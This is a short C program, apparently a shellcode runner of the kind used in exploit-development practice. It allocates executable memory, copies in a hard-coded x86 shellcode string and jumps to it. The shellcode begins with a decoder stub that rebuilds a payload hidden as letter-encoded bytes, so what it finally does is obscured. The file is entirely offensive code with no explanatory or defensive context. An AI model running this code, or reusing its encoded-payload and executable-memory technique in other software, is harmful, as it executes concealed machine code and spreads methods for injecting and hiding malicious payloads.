#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>
char shellcode[] = "\xeb\x26\x5a\x8d\x72\x01\x31\xc0\x31\xdb\x66\x8b\x0c\x06\x66\x81\xe9\x61\x61\xc0\xe1\x04\x00\xe9\x32\x0a\x88\x0c\x1e\x43\x83\xc0\x02\x83\xf8\x28\x72\xe4\xeb\x06\xe8\xd5\xff\xff\xff\x0a\x61\x6b\x61\x6c\x61\x69\x61\x6a\x61\x6f\x61\x61\x6d\x61\x6e\x61\x63\x61\x64\x61\x61\x61\x62\x61\x67\x61\x68\x61\x65\x61\x66\x62\x6b\x62\x6c\x62\x69\x62\x6a";
void main()
{
char *buf;
int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
int flags = MAP_PRIVATE | MAP_ANONYMOUS;
buf = mmap(0, sizeof(shellcode), prot, flags, -1, 0);
memcpy(buf, shellcode, sizeof(shellcode));
((void (*)(void))buf)();    
}
